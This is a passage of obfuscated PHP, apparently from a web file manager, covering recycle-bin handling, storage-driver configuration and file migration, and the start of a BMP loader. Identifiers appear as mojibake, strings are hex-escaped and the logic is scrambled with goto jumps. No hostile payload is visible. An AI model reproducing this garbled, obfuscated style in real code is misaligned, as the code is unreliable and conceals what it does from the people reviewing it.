$c¬∆ÌªÑ¶ë) { $Düãû˘ÁîÇ = $C±Éõëç˜Û[406] . $c¬∆ÌªÑ¶ë[$C±Éõëç˜Û[366]]; self::$cacheSourceInfo[$Düãû˘ÁîÇ] = $c¬∆ÌªÑ¶ë; } return $eƒÀ ¨ÿŒã; } public function fileNameAuto($A•Ó• ¿¶Ÿ, $FÍåç¢áÍÇ, $f«™ûªˆßÀ = REPEAT_RENAME, $Aã®ê≤§€… = false) { $a∆ö’ø°ê© =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÔ•ù±±‡à = $this->childList($A•Ó• ¿¶Ÿ); $A€»àùëÿÑ = array_to_keyvalue($bÔ•ù±±‡à, $a∆ö’ø°ê©[33], $a∆ö’ø°ê©[28]); return $this->fileNameAutoGet($A€»àùëÿÑ, $FÍåç¢áÍÇ, $f«™ûªˆßÀ, $Aã®ê≤§€…); } public function fileNameAutoGet($f „‰ ûÌã, $eÉ’„Ö≤À∫, $eÇ¨≤Âêù´, $a‘Ü≠äòÍ≠) { $e‘ﬂ≥Î≈ø’ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($eÇ¨≤Âêù´ == REPEAT_REPLACE || !$f „‰ ûÌã || !in_array_not_case($eÉ’„Ö≤À∫, $f „‰ ûÌã) || $a‘Ü≠äòÍ≠ && $eÇ¨≤Âêù´ != REPEAT_RENAME_FOLDER) { return $eÉ’„Ö≤À∫; } if ($eÇ¨≤Âêù´ == REPEAT_SKIP) { return !1; } $bÀµäÖÿ‡ó = $e‘ﬂ≥Î≈ø’[94] . get_path_ext($eÉ’„Ö≤À∫); $bÀµäÖÿ‡ó = $bÀµäÖÿ‡ó == $e‘ﬂ≥Î≈ø’[94] || $a‘Ü≠äòÍ≠ ? $e‘ﬂ≥Î≈ø’[33] : $bÀµäÖÿ‡ó; for ($e·Ÿª“ˆ√õ = 1; $e·Ÿª“ˆ√õ <= count($f „‰ ûÌã) + 1; $e·Ÿª“ˆ√õ++) { $d™ø‰Œü´© = substr($eÉ’„Ö≤À∫, 0, strlen($eÉ’„Ö≤À∫) - strlen($bÀµäÖÿ‡ó)); $eáÀ›´∆ÏÏ = $d™ø‰Œü´© . "\50{$e·Ÿª“ˆ√õ}\x29{$bÀµäÖÿ‡ó}"; if (!in_array_not_case($eáÀ›´∆ÏÏ, $f „‰ ûÌã)) { return $eáÀ›´∆ÏÏ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\162\x63\145\137\x72\145\x63\x79\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\124\x69\x6d\145", "\x74\x69\155\145", "\x69\156\x73\145\162\164", "\x66\x75\x6e\143\164\151\x6f\156")); public function listData($EñÿÉ≈…ª¥ = false) { $A≥÷ÓÎàÒΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EñÿÉ≈…ª¥ = $EñÿÉ≈…ª¥ ? $EñÿÉ≈…ª¥ : USER_ID; $Aƒû⁄∞÷µû = $this->where(array($A≥÷ÓÎàÒΩ[1340] => $EñÿÉ≈…ª¥))->select(); return array_to_keyvalue($Aƒû⁄∞÷µû, $A≥÷ÓÎàÒΩ[33], $A≥÷ÓÎàÒΩ[366]); } public function moveToRecycle($F§∑æÌÁ©∫) { goto bÿÏÖ·˜õë; bÿÏÖ·˜õë: $føÿ‰†å≈à =& $_SERVER[£¿ÌÙëü¡¯¯]; $FµÔÂ∞≥÷Â = Model($føÿ‰†å≈à[1084]); $Cı⁄Œåæ⁄Ê = $FµÔÂ∞≥÷Â->sourceInfo($F§∑æÌÁ©∫); goto e˜ºÊ∂ÿ»ê; e˜ºÊ∂ÿ»ê: if (!$Cı⁄Œåæ⁄Ê || $Cı⁄Œåæ⁄Ê[$føÿ‰†å≈à[393]] == $føÿ‰†å≈à[84]) { return; } $aŒÔöÍ§∑≠ = array($føÿ‰†å≈à[380] => $F§∑æÌÁ©∫, $føÿ‰†å≈à[1340] => USER_ID, $føÿ‰†å≈à[513] => $Cı⁄Œåæ⁄Ê[$føÿ‰†å≈à[368]], $føÿ‰†å≈à[514] => $Cı⁄Œåæ⁄Ê[$føÿ‰†å≈à[452]], $føÿ‰†å≈à[517] => $Cı⁄Œåæ⁄Ê[$føÿ‰†å≈à[455]]); $this->add($aŒÔöÍ§∑≠); goto b»è√ﬂ”¡Ò; b»è√ﬂ”¡Ò: $this->recycleMove($F§∑æÌÁ©∫, 1); if ($Cı⁄Œåæ⁄Ê[$føÿ‰†å≈à[367]] == $føÿ‰†å≈à[84]) { $fò÷…¶™πÁ = array($føÿ‰†å≈à[517] => array($føÿ‰†å≈à[475], $Cı⁄Œåæ⁄Ê[$føÿ‰†å≈à[455]] . $F§∑æÌÁ©∫ . $føÿ‰†å≈à[476])); $FµÔÂ∞≥÷Â->where($fò÷…¶™πÁ)->setField($føÿ‰†å≈à[393], 1); } goto CÕ®¡ŒëÌ; CÕ®¡ŒëÌ: } public function clear() { $this->remove(!1); } public function remove($f¡¥ºÉË≈í = false) { goto E´äÔè¡â⁄; E´äÔè¡â⁄: $b¯ÒÖé∏éö =& $_SERVER[£¿ÌÙëü¡¯¯]; $c≈Ò÷õÖÖ≤ = Model($b¯ÒÖé∏éö[1084]); $D˜˘ûÔ˜ºÙ = $this->listData(); goto a·ÉöŸ¨ëÌ; a·ÉöŸ¨ëÌ: $f¡¥ºÉË≈í = $f¡¥ºÉË≈í === !1 ? !1 : $f¡¥ºÉË≈í; $E‡‹¬Æ‡ßÍ = array(); foreach ($D˜˘ûÔ˜ºÙ as $eµ¬∏ìãÉé) { if ($f¡¥ºÉË≈í != !1 && !in_array($eµ¬∏ìãÉé, $f¡¥ºÉË≈í)) { continue; } $c≈Ò÷õÖÖ≤->remove($eµ¬∏ìãÉé, !1); $c’´¨∆⁄å• = $this->where(array($b¯ÒÖé∏éö[366] => $eµ¬∏ìãÉé))->find(); $C›ÎÍè≥πÕ = $c’´¨∆⁄å•[$b¯ÒÖé∏éö[368]] . $b¯ÒÖé∏éö[71] . $c’´¨∆⁄å•[$b¯ÒÖé∏éö[452]]; $E‡‹¬Æ‡ßÍ[$C›ÎÍè≥πÕ] = array($b¯ÒÖé∏éö[513] => $c’´¨∆⁄å•[$b¯ÒÖé∏éö[368]], $b¯ÒÖé∏éö[452] => $c’´¨∆⁄å•[$b¯ÒÖé∏éö[452]]); $this->where(array($b¯ÒÖé∏éö[366] => $eµ¬∏ìãÉé))->delete(); } goto E—èÎ‚≤ñ∑; E—èÎ‚≤ñ∑: foreach ($E‡‹¬Æ‡ßÍ as $f§≥≈ÓØê⁄) { $c≈Ò÷õÖÖ≤->targetSpaceUpdate($f§≥≈ÓØê⁄[$b¯ÒÖé∏éö[368]], $f§≥≈ÓØê⁄[$b¯ÒÖé∏éö[452]]); } goto E´±çô÷´ª; E´±çô÷´ª: } public function restore($F£ë⁄˜∂ﬁÕ = false) { goto C≤≠äÇ’≈…; C≤≠äÇ’≈…: $eõ£∑ìœúÀ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÔ¨®àÁ÷ä = Model($eõ£∑ìœúÀ[1084]); $BùÛëŒ–∑Ù = $this->listData(); goto cçÀçæóÌÓ; d˜ÚÈ©∞˘∂: foreach ($BùÛëŒ–∑Ù as $bÓ‹°ÕÃı›) { goto còÛó∞«ê°; bãâÕÎ“òÇ: if ($f¬ÓáçÌù’[$eõ£∑ìœúÀ[393]] == $eõ£∑ìœúÀ[84]) { continue; } $EÔ¨®àÁ÷ä->lockMoveStart($bÓ‹°ÕÃı›); $this->recycleMove($bÓ‹°ÕÃı›, 0); goto fΩâ’ ﬁ≈∏; fåÁ∑⁄äùÎ: $açèº≤Ëπ¯[] = $Fë®ÁõÍ¥â[$eõ£∑ìœúÀ[457]]; if ($Fë®ÁõÍ¥â[$eõ£∑ìœúÀ[367]] == $eõ£∑ìœúÀ[84]) { $açèº≤Ëπ¯[] = $bÓ‹°ÕÃı›; } $EÔ¨®àÁ÷ä->lockMoveEnd($bÓ‹°ÕÃı›); goto Aé”ñ√§∫ß; còÛó∞«ê°: if ($F£ë⁄˜∂ﬁÕ != !1 && !in_array($bÓ‹°ÕÃı›, $F£ë⁄˜∂ﬁÕ)) { continue; } $Fë®ÁõÍ¥â = $EÔ¨®àÁ÷ä->sourceInfo($bÓ‹°ÕÃı›); $f¬ÓáçÌù’ = $EÔ¨®àÁ÷ä->sourceInfo($Fë®ÁõÍ¥â[$eõ£∑ìœúÀ[457]]); goto bãâÕÎ“òÇ; fΩâ’ ﬁ≈∏: if ($Fë®ÁõÍ¥â[$eõ£∑ìœúÀ[367]] == $eõ£∑ìœúÀ[84]) { $bÚóæô©´Ø = array($eõ£∑ìœúÀ[517] => array($eõ£∑ìœúÀ[475], $Fë®ÁõÍ¥â[$eõ£∑ìœúÀ[455]] . $bÓ‹°ÕÃı› . $eõ£∑ìœúÀ[476])); $EÔ¨®àÁ÷ä->where($bÚóæô©´Ø)->setField($eõ£∑ìœúÀ[393], 0); } $this->where(array($eõ£∑ìœúÀ[366] => $bÓ‹°ÕÃı›))->delete(); $EÔ¨®àÁ÷ä->folderSizeReset($Fë®ÁõÍ¥â[$eõ£∑ìœúÀ[457]]); goto fåÁ∑⁄äùÎ; Aé”ñ√§∫ß: } $EÔ¨®àÁ÷ä->updateModifyTime($açèº≤Ëπ¯); goto a˘ÑÛóìÃ∂; cçÀçæóÌÓ: $F£ë⁄˜∂ﬁÕ = $F£ë⁄˜∂ﬁÕ == !1 ? !1 : $F£ë⁄˜∂ﬁÕ; if (!$BùÛëŒ–∑Ù) { return !0; } $açèº≤Ëπ¯ = array(); goto d˜ÚÈ©∞˘∂; a˘ÑÛóìÃ∂: } private function recycleMove($b›ì≥ó ãº, $bﬂø»¯Á·“ = 1) { $aƒÚÇˆÚçì =& $_SERVER[£¿ÌÙëü¡¯¯]; $cÜÜÏƒ£È‹ = Model($aƒÚÇˆÚçì[1084]); $Fì “≠ëûø = Model($aƒÚÇˆÚçì[2249]); $aπ¥”ÆÊŸâ = array($aƒÚÇˆÚçì[366] => $b›ì≥ó ãº); if ($bﬂø»¯Á·“) { $cÜÜÏƒ£È‹->where($aπ¥”ÆÊŸâ)->setField($aƒÚÇˆÚçì[393], 1); $Fì “≠ëûø->eventRecycle($b›ì≥ó ãº, $aƒÚÇˆÚçì[2250]); } else { $FÊáùª«åå = $cÜÜÏƒ£È‹->where($aπ¥”ÆÊŸâ)->find(); $fçœú§¿Æè = $FÊáùª«åå[$aƒÚÇˆÚçì[367]] == $aƒÚÇˆÚçì[84]; $aËÀÇÔÌ∆® = $cÜÜÏƒ£È‹->fileNameAuto($FÊáùª«åå[$aƒÚÇˆÚçì[457]], $FÊáùª«åå[$aƒÚÇˆÚçì[28]], REPEAT_RENAME_FOLDER, $fçœú§¿Æè); if ($aËÀÇÔÌ∆® != $FÊáùª«åå[$aƒÚÇˆÚçì[28]]) { $cÜÜÏƒ£È‹->rename($b›ì≥ó ãº, $aËÀÇÔÌ∆®); } $cÜÜÏƒ£È‹->where($aπ¥”ÆÊŸâ)->setField($aƒÚÇˆÚçì[393], 0); $Fì “≠ëûø->eventRecycle($b›ì≥ó ãº, $aƒÚÇˆÚçì[2251]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\163\x74\157\x72\141\x67\x65\114\151\163\x74"; public $field = array("\156\141\155\x65", "\x73\x69\172\145\x4d\141\x78", "\x73\x79\163\164\x65\x6d", "\x64\x65\x66\x61\165\x6c\x74", "\x64\162\x69\166\145\x72", "\143\x6f\x6e\146\x69\x67"); public function listData($DΩÿ¢¯‘òê = false, $A⁄€€áÜ¢… = "\x6d\157\144\x69\146\171\124\x69\155\145", $aë¨≈π–âò = false) { goto EùÊäáﬂ§ﬁ; a¢¨√‡Æ∞Õ: foreach ($aö∫§¨»ôá as $d˜´ÛË±ó» => $aÎ»Éëùß‹) { unset($aö∫§¨»ôá[$d˜´ÛË±ó»][$fﬁó·§∂¥Ü[6]]); $aö∫§¨»ôá[$d˜´ÛË±ó»][$fﬁó·§∂¥Ü[1999]] = 0; } $f‰´®¨Œ≈ˆ = array_to_keyvalue($aö∫§¨»ôá, $fﬁó·§∂¥Ü[33], $fﬁó·§∂¥Ü[364]); $this->_listAppendSize($aö∫§¨»ôá, $f‰´®¨Œ≈ˆ); goto EµÙóÆÇ∑π; EµÙóÆÇ∑π: return $aö∫§¨»ôá; goto B–≠¯≠ΩÖÖ; EùÊäáﬂ§ﬁ: $fﬁó·§∂¥Ü =& $_SERVER[£¿ÌÙëü¡¯¯]; $aö∫§¨»ôá = parent::listData($DΩÿ¢¯‘òê, $A⁄€€áÜ¢…, $aë¨≈π–âò); if ($DΩÿ¢¯‘òê) { return $aö∫§¨»ôá; } goto a¢¨√‡Æ∞Õ; B–≠¯≠ΩÖÖ: } public function _listAppendSize(&$f¬ºÑ¯™◊÷, $Cïóï¢Ç·∫) { $b˜ÆÛ‡… « =& $_SERVER[£¿ÌÙëü¡¯¯]; $D¿∞Î§úÊä = $b˜ÆÛ‡… «[2252] . implode($b˜ÆÛ‡… «[47], $Cïóï¢Ç·∫) . $b˜ÆÛ‡… «[2253]; $f¨€¥ºŸ©ç = Model($b˜ÆÛ‡… «[709])->query($D¿∞Î§úÊä); $f¨€¥ºŸ©ç = array_to_keyvalue($f¨€¥ºŸ©ç, $b˜ÆÛ‡… «[364], $b˜ÆÛ‡… «[78]); foreach ($f¬ºÑ¯™◊÷ as $bÙÁÌ√œëΩ => $bÛ≤ª¡›Á‰) { $f¬ºÑ¯™◊÷[$bÙÁÌ√œëΩ][$b˜ÆÛ‡… «[1999]] = isset($f¨€¥ºŸ©ç[$bÛ≤ª¡›Á‰[$b˜ÆÛ‡… «[364]]]) ? $f¨€¥ºŸ©ç[$bÛ≤ª¡›Á‰[$b˜ÆÛ‡… «[364]]] : 0; } } public function getConfig($a±áΩåø∞µ) { $Aß´ßÂ±©Œ = parent::listData($a±áΩåø∞µ); return json_decode($Aß´ßÂ±©Œ[$_SERVER[£¿ÌÙëü¡¯¯][6]], !0); } public function update($D…ÑÚÇ°¿ê, $Bÿ”Ëã‹„„) { goto Aµ¨àπâ∆¨; Aµ¨àπâ∆¨: $c“ìêÃ¯Àˆ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cﬂŸæëÎáÔ = $Bÿ”Ëã‹„„[$c“ìêÃ¯Àˆ[28]]; $câ≠∑è§∫æ = array_to_keyvalue(parent::listData(), $c“ìêÃ¯Àˆ[28]); goto Då“óßºçﬁ; Eß÷ûãÿêÒ: $C∞ëïä’õÏ = parent::update($D…ÑÚÇ°¿ê, $Bÿ”Ëã‹„„); if ($C∞ëïä’õÏ && $Bÿ”Ëã‹„„[$c“ìêÃ¯Àˆ[34]]) { foreach ($câ≠∑è§∫æ as $FÜäÁÀÿ‘Ö) { if ($FÜäÁÀÿ‘Ö[$c“ìêÃ¯Àˆ[34]] && $FÜäÁÀÿ‘Ö[$c“ìêÃ¯Àˆ[364]] != $D…ÑÚÇ°¿ê) { parent::update($FÜäÁÀÿ‘Ö[$c“ìêÃ¯Àˆ[364]], array($c“ìêÃ¯Àˆ[34] => 0)); } } } return $C∞ëïä’õÏ; goto b–¶ºú‚”ñ; Då“óßºçﬁ: if (isset($câ≠∑è§∫æ[$cﬂŸæëÎáÔ]) && $câ≠∑è§∫æ[$cﬂŸæëÎáÔ][$c“ìêÃ¯Àˆ[364]] != $D…ÑÚÇ°¿ê) { return !1; } if (isset($Bÿ”Ëã‹„„[$c“ìêÃ¯Àˆ[2254]]) && $Bÿ”Ëã‹„„[$c“ìêÃ¯Àˆ[2254]] == $c“ìêÃ¯Àˆ[84]) { $this->checkConfig($Bÿ”Ëã‹„„); } unset($Bÿ”Ëã‹„„[$c“ìêÃ¯Àˆ[2254]]); goto Eß÷ûãÿêÒ; b–¶ºú‚”ñ: } public function add($cı‚»èÉÈÍ) { goto e≤∆â™÷´«; b“©˘èë°‚: $this->checkConfig($cı‚»èÉÈÍ); $BÁ‡–¥◊Ìı = parent::insert($cı‚»èÉÈÍ); if ($BÁ‡–¥◊Ìı && $cı‚»èÉÈÍ[$fãÜÙŸÔöó[34]]) { foreach ($a‚ñ≠üâœÊ as $c±€ëıÒ∂ª) { if ($c±€ëıÒ∂ª[$fãÜÙŸÔöó[34]]) { parent::update($c±€ëıÒ∂ª[$fãÜÙŸÔöó[364]], array($fãÜÙŸÔöó[34] => 0)); } } } goto fÿÍêÓÎè‰; fÿÍêÓÎè‰: return $BÁ‡–¥◊Ìı; goto fÆÎ‘ü‡Û”; e≤∆â™÷´«: $fãÜÙŸÔöó =& $_SERVER[£¿ÌÙëü¡¯¯]; $a‚ñ≠üâœÊ = array_to_keyvalue(parent::listData(), $fãÜÙŸÔöó[28]); if (isset($a‚ñ≠üâœÊ[$cı‚»èÉÈÍ[$fãÜÙŸÔöó[28]]])) { return !1; } goto b“©˘èë°‚; fÆÎ‘ü‡Û”: } public function checkConfig(&$D¬∏ú±÷ßú) { goto eÆõÒÕ€≈Ë; Eˆ∫îÊùÚ: $D¬∏ú±÷ßú[$EùÇÂ¥Íö∂[6]] = json_encode($f™˜áû‚ÉÈ); $D¬∏ú±÷ßú[$EùÇÂ¥Íö∂[91]] = $bë•ƒë—ãµ; return !0; goto cÏı°âÒ∆∫; FÙé≤øÌº¶: foreach ($f™˜áû‚ÉÈ as $E§¡¡†€Œ≥ => $Eã“à·ÉﬂË) { $f™˜áû‚ÉÈ[$E§¡¡†€Œ≥] = trim($Eã“à·ÉﬂË); } $Aﬂ•ú÷‡ì® = rtrim($f™˜áû‚ÉÈ[$EùÇÂ¥Íö∂[997]], $EùÇÂ¥Íö∂[8]) . $EùÇÂ¥Íö∂[8]; $bë•ƒë—ãµ = $this->driverType($E–âæ‘ª¬ò); goto eøø∑Êï˜ª; eÆõÒÕ€≈Ë: $EùÇÂ¥Íö∂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $E–âæ‘ª¬ò = strtolower($D¬∏ú±÷ßú[$EùÇÂ¥Íö∂[91]]); $f™˜áû‚ÉÈ = json_decode_force($D¬∏ú±÷ßú[$EùÇÂ¥Íö∂[6]]); goto FÙé≤øÌº¶; B—‡¨íÁ®†: $E¶ŸÕÖ∞„ø = $aØ¿ÌêÙÓç->getPath($Aﬂ•ú÷‡ì® . $EùÇÂ¥Íö∂[1896]); if (!$aØ¿ÌêÙÓç->mkfile($E¶ŸÕÖ∞„ø)) { show_json(LNG($EùÇÂ¥Íö∂[2255]), !1); } $f™˜áû‚ÉÈ[$EùÇÂ¥Íö∂[997]] = $Aﬂ•ú÷‡ì®; goto Eˆ∫îÊùÚ; eøø∑Êï˜ª: $Dî˜™à∞Á‚ = $EùÇÂ¥Íö∂[72] . $bë•ƒë—ãµ; $aØ¿ÌêÙÓç = new $Dî˜™à∞Á‚($f™˜áû‚ÉÈ); if (in_array($E–âæ‘ª¬ò, $aØ¿ÌêÙÓç->objectDriver)) { if (!$aØ¿ÌêÙÓç->isBucketCors() && !$aØ¿ÌêÙÓç->setBucketCors()) { $eÒ⁄ãËú⁄© = LNG($EùÇÂ¥Íö∂[2255]); $eÒ⁄ãËú⁄© .= $EùÇÂ¥Íö∂[2256] . LNG($EùÇÂ¥Íö∂[2257]); show_json($eÒ⁄ãËú⁄©, !1); } } goto B—‡¨íÁ®†; cÏı°âÒ∆∫: } private function driverType($CÍßÔéÖ›≠) { $AåÀÖÖˆ«⁄ =& $_SERVER[£¿ÌÙëü¡¯¯]; $fæå‚œ∑Í∑ = array($AåÀÖÖˆ«⁄[104] => $AåÀÖÖˆ«⁄[2258], $AåÀÖÖˆ«⁄[58] => $AåÀÖÖˆ«⁄[2259], $AåÀÖÖˆ«⁄[65] => $AåÀÖÖˆ«⁄[998]); if (isset($fæå‚œ∑Í∑[$CÍßÔéÖ›≠])) { return $fæå‚œ∑Í∑[$CÍßÔéÖ›≠]; } return strtoupper($CÍßÔéÖ›≠); } public function driverListSystem() { $AåÃ¬í•îú =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eﬂ≈ÎÑ’àŒ = parent::listData(); $dëöÍüÁ†∫ = array(); foreach ($Eﬂ≈ÎÑ’àŒ as $B⁄•Íñç≤Ô) { unset($B⁄•Íñç≤Ô[$AåÃ¬í•îú[184]], $B⁄•Íñç≤Ô[$AåÃ¬í•îú[108]]); $B⁄•Íñç≤Ô[$AåÃ¬í•îú[6]] = json_decode_force($B⁄•Íñç≤Ô[$AåÃ¬í•îú[6]]); $dëöÍüÁ†∫[] = $B⁄•Íñç≤Ô; } return $dëöÍüÁ†∫; } public function defaultDriver() { $eúè‚¬—„“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÓ‚¡πá™è = parent::listData(); $fö·°ÒÛ⁄∞ = array_filter_by_field($bÓ‚¡πá™è, $eúè‚¬—„“[34], 1); $fö·°ÒÛ⁄∞ = $fö·°ÒÛ⁄∞[0]; if ($fö·°ÒÛ⁄∞) { $fö·°ÒÛ⁄∞[$eúè‚¬—„“[6]] = json_decode($fö·°ÒÛ⁄∞[$eúè‚¬—„“[6]], !0); } return $fö·°ÒÛ⁄∞; } public function driverInfo($aò†ˆé∞ÖÇ) { $eé£œµ’± =& $_SERVER[£¿ÌÙëü¡¯¯]; $bƒîø∑ºÎ‡ = array_to_keyvalue(parent::listData(), $eé£œµ’±[364]); if (!isset($bƒîø∑ºÎ‡[$aò†ˆé∞ÖÇ])) { return !1; } $c€Âõ•–˜“ = $bƒîø∑ºÎ‡[$aò†ˆé∞ÖÇ]; $c€Âõ•–˜“[$eé£œµ’±[6]] = json_decode_force($c€Âõ•–˜“[$eé£œµ’±[6]]); return $c€Âõ•–˜“; } public function removeWithFile($fñ∂ÕôïáÉ) { goto båŒ–çâ¬º; dÎ—ãÀö“•: $a∫ÜÆÔΩÜ¶ = "\173\x69\157\72{$DÙ‰«ŸèóÜ}\x7d\x2f"; $bÖÊ¬ﬂåÁ« = !0; $cåˆ¯≠ÍÜ— = array(); goto e‘¡∆í˜‚Ï; e‘¡∆í˜‚Ï: $E®¬««Ëë› = Model($dîØ©ƒ∏‚¢[164])->where($añ’≈é˜Ô·)->field($dîØ©ƒ∏‚¢[2263])->select(); foreach ($E®¬««Ëë› as $e◊÷ˆ¶èêÑ) { goto aˆ¥êÓîÓÉ; aˆ¥êÓîÓÉ: $b¨âÀ‰…€° = $e◊÷ˆ¶èêÑ[$dîØ©ƒ∏‚¢[76]]; $cí∆§›áª¨ = $a∫ÜÆÔΩÜ¶ . str_replace("\x7b\x69\157\x3a{$fñ∂ÕôïáÉ}\x7d\57", $dîØ©ƒ∏‚¢[33], $b¨âÀ‰…€°); if (!IO::exist($b¨âÀ‰…€°)) { $cåˆ¯≠ÍÜ—[] = $e◊÷ˆ¶èêÑ[$dîØ©ƒ∏‚¢[415]]; $d„ÑÌëÌﬂ¥->updateFileEnd($e◊÷ˆ¶èêÑ[$dîØ©ƒ∏‚¢[28]], $e◊÷ˆ¶èêÑ[$dîØ©ƒ∏‚¢[78]]); continue; } goto EÒŸ¯∑ÜÑ«; b◊∆ñìÎµä: $bÀêÒﬁó‹í = array($dîØ©ƒ∏‚¢[710] => $DÙ‰«ŸèóÜ, $dîØ©ƒ∏‚¢[76] => $cí∆§›áª¨); Model($dîØ©ƒ∏‚¢[164])->where($añ’≈é˜Ô·)->save($bÀêÒﬁó‹í); goto d∏∫ä…Ïàƒ; EÒŸ¯∑ÜÑ«: if (IO::exist($cí∆§›áª¨)) { $d„ÑÌëÌﬂ¥->updateFileEnd($e◊÷ˆ¶èêÑ[$dîØ©ƒ∏‚¢[28]], $e◊÷ˆ¶èêÑ[$dîØ©ƒ∏‚¢[78]]); continue; } if (!IO::move($b¨âÀ‰…€°, get_path_father($cí∆§›áª¨))) { $bÖÊ¬ﬂåÁ« = !1; break; } $añ’≈é˜Ô· = array($dîØ©ƒ∏‚¢[415] => $e◊÷ˆ¶èêÑ[$dîØ©ƒ∏‚¢[415]]); goto b◊∆ñìÎµä; d∏∫ä…Ïàƒ: } $this->removeByFileID($cåˆ¯≠ÍÜ—); goto DªÔ≥ÙÌÛÌ; F‹≈é£ã≤›: $f¬Ö™ëºôØ = Model($dîØ©ƒ∏‚¢[418])->where($añ’≈é˜Ô·)->sum($dîØ©ƒ∏‚¢[78]); $FÍÔà’‹∑¶ = $dîØ©ƒ∏‚¢[2260] . $fñ∂ÕôïáÉ; $d„ÑÌëÌﬂ¥ = new TaskFileTransfer($FÍÔà’‹∑¶, $dîØ©ƒ∏‚¢[2261], $cÏÈá§åı√, LNG($dîØ©ƒ∏‚¢[2262]) . "\50{$fñ∂ÕôïáÉ}\51"); goto aá„⁄â¬±…; DªÔ≥ÙÌÛÌ: if (!$bÖÊ¬ﬂåÁ«) { $d„ÑÌëÌﬂ¥->stop($FÍÔà’‹∑¶); return !1; } $d„ÑÌëÌﬂ¥->end(); return parent::remove($fñ∂ÕôïáÉ); goto B á–Ÿæ∞à; aá„⁄â¬±…: $d„ÑÌëÌﬂ¥->task[$dîØ©ƒ∏‚¢[685]] = (double) $f¬Ö™ëºôØ; $E˜–º≤è— = KodIO::defaultDriver(); $DÙ‰«ŸèóÜ = $E˜–º≤è—[$dîØ©ƒ∏‚¢[364]]; goto dÎ—ãÀö“•; båŒ–çâ¬º: $dîØ©ƒ∏‚¢ =& $_SERVER[£¿ÌÙëü¡¯¯]; $añ’≈é˜Ô· = array($dîØ©ƒ∏‚¢[710] => $fñ∂ÕôïáÉ); $cÏÈá§åı√ = Model($dîØ©ƒ∏‚¢[418])->where($añ’≈é˜Ô·)->count(); goto F‹≈é£ã≤›; B á–Ÿæ∞à: } public function progress($C †äõôÜè) { return Task::get($_SERVER[£¿ÌÙëü¡¯¯][2260] . $C †äõôÜè); } private function removeByFileID($fûÍò¿ÜØ∏ = array()) { goto FŸÏ’æÃ∂; FŸÏ’æÃ∂: $d◊Ö˜¡∞ƒÊ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($fûÍò¿ÜØ∏)) { return; } $FÒÈÂÈÙä = array($d◊Ö˜¡∞ƒÊ[415] => array($d◊Ö˜¡∞ƒÊ[7], $fûÍò¿ÜØ∏)); goto e‚Ï–˘∑±ó; e‚Ï–˘∑±ó: $cõèëãûØõ = Model($d◊Ö˜¡∞ƒÊ[1084])->where($FÒÈÂÈÙä)->field($d◊Ö˜¡∞ƒÊ[366])->select(); if (!$cõèëãûØõ) { return; } $cõèëãûØõ = array_to_keyvalue($cõèëãûØõ, $d◊Ö˜¡∞ƒÊ[33], $d◊Ö˜¡∞ƒÊ[366]); goto DÃå»õ“µ’; DÃå»õ“µ’: foreach ($cõèëãûØõ as $bÌ∂¢∏«ÑÖ) { Model($d◊Ö˜¡∞ƒÊ[379])->remove($bÌ∂¢∏«ÑÖ, !1); } goto EºöØ¡§¥Î; EºöØ¡§¥Î: } } goto CˆÒ‚å°¡ì; c»Ÿ¥Ê·…Ï: class ImageGdBMP { public static function load($fË±‚≤ââ◊) { $Eå„Ùù∞´◊ = fopen($fË±‚≤ââ◊, $_SERVER[£¿ÌÙëü¡¯¯][1428]); if ($Eå„Ùù∞´◊ === !1) { return !1; } $aâ’ù™á„ = self::loadFromStream($Eå„Ùù∞´◊); fclose($Eå„Ùù∞´◊); return $aâ’ù™á„; } public static function loadFromStream($Fã«ï»ƒñ—) { $E⁄¥’»†π¥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dà™¥âô°Ô = fread($Fã«ï»ƒñ—, 14); if ($dà™¥âô°Ô === !1) { return !1; } if ($dà™¥âô°Ô[0] != $E⁄¥’»†π¥[1740] || $dà™¥âô°Ô[1] != $E⁄¥’»†π¥[1741]) { return !1; } $DæñüÔå … = unpack($E⁄¥’»†π¥[1742] . $E⁄¥’»†π¥[1743] . $E⁄¥’»†π¥[1744] . $E⁄¥’»†π¥[1745] . $E⁄¥’»†π¥[1746], $dà™¥âô°Ô); return self::loadFromStreamAndFileHeader($Fã«ï»ƒñ—, $DæñüÔå …); } public static function loadFromStreamAndFileHeader($Eﬁ∂÷Ñ˘û®, array $cƒªçñ¿´„) { goto d™π†’∑û; d™π†’∑û: $C©‹¬øÜ¥ƒ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($cƒªçñ¿´„[$C©‹¬øÜ¥ƒ[385]] != 19778) { return !1; } $bìòæ‘‹—ù = fread($Eﬁ∂÷Ñ˘û®, 4); goto AŒºá∂€ı®; AŒºá∂€ı®: if ($bìòæ‘‹—ù === !1) { return !1; } list(, $a™Œ•Ω÷îê) = unpack($C©‹¬øÜ¥ƒ[1747], $bìòæ‘‹—ù); if ($a™Œ•Ω÷îê == 12) { goto fØÈÕÚõêˆ; aù™ÓÑç«¡: $eÎ≤÷Æ‘¶• = 255; goto a‹ß¶«≠◊É; fØÈÕÚõêˆ: $bìòæ‘‹—ù = fread($Eﬁ∂÷Ñ˘û®, $a™Œ•Ω÷îê - 4); if ($bìòæ‘‹—ù === !1) { return !1; } extract(unpack($C©‹¬øÜ¥ƒ[1748] . $C©‹¬øÜ¥ƒ[1749] . $C©‹¬øÜ¥ƒ[1750] . $C©‹¬øÜ¥ƒ[1751], $bìòæ‘‹—ù)); goto eúã±†´‰Ì; eúã±†´‰Ì: $eå•º∑Æü» = $EÁÖ…Ω‹æÁ = $BÏâ—‰ôÔô = $E‘õ›¬÷ßƒ = 0; $E‚Ñıøé‚⁄ = 16711680; $aä£òà·€ = 65280; goto aù™ÓÑç«¡; a‹ß¶«≠◊É: } else { if (124 < $a™Œ•Ω÷îê || $a™Œ•Ω÷îê < 40) { return !1; } else { goto f≈¨øØ ¯; AÀû≤ΩÉÍº: if 